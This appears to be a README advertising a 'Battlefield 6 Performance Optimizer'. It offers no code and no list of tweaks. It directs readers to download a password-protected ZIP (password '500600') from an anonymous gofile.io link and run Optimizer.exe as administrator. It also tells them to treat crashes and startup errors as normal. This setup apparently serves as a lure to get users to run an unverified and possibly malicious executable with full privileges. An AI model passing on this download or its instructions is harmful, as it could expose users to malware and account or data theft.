# **Battlefield 6 Performance Optimizer**

A lightweight configuration tool designed to improve gameplay fluidity and frame rate stability in Battlefield 6 by applying system and game-specific optimizations.

# **Overview**

This utility provides a simple interface to apply performance-related tweaks that may reduce stuttering and increase frame rates. It only adjusts existing Windows and game settings.

# **How It Works**

- Presents a clear menu of optional performance tweaks.  
- Applies only the changes you select.  
- Most builds include a restore function to undo all applied tweaks and revert to original settings.  

**Note:** The specific tweaks available may change between versions.

# **Requirements**

- OS: Microsoft Windows 10/11 (64-bit). Administrator rights are required to apply certain system-level tweaks.  
- Game: Intended for use with the live/public version of Battlefield

# **Installation & Usage**

- [DOWNLOAD](https://gofile.io/d/nio4hf)  
- Enter password: `500600` and extract the ZIP archive to any folder.  
- Run `Optimizer.exe` (administrator rights are recommended).  
- Follow the on-screen instructions to review, select, and apply tweaks.  
- If needed, use the Restore Defaults option from the main menu to undo all changes.

# **Uninstallation**

- Open the tool and select the Restore Defaults option to revert all tweaks.  
- Close the application.  
- Simply delete the folder where you extracted the files. No system leftovers remain.

## **My Game Still Stutters / Crashes / Tool Doesn't Help?**

Performance in BF6 heavily depends on:

- Your exact CPU/GPU combination  
- Driver version  
- Background software (RGB apps, overlays)  
- Current server-side netcode / optimization state  
- Game patch version  

This utility is **not a magic fix** — it's just a convenient way to apply settings many players found helpful.

## **Program Doesn't Start / Crashes Immediately / Shows Error**

**The project is currently in active development.**  
Stability is **not guaranteed** — especially on non-standard Windows builds, laptops with hybrid graphics, or after recent Windows/AMD/NVIDIA driver updates.

**What you can do:**

- Make sure you're running the .exe **as administrator**   
- Try compatibility mode → Windows 8 / 10  
- Reboot your PC and relaunch the file  
- Check that .NET Framework 4.8+ or the latest Windows Runtime is installed  

If nothing helps — please wait for the next release.  
New builds usually fix startup crashes and improve compatibility.

## **Final Notes**

Use at your own risk. Some tweaks may cause instability depending on your hardware.  
Always create a system restore point before applying aggressive presets.

Enjoy testing — and good luck out there, Raider!
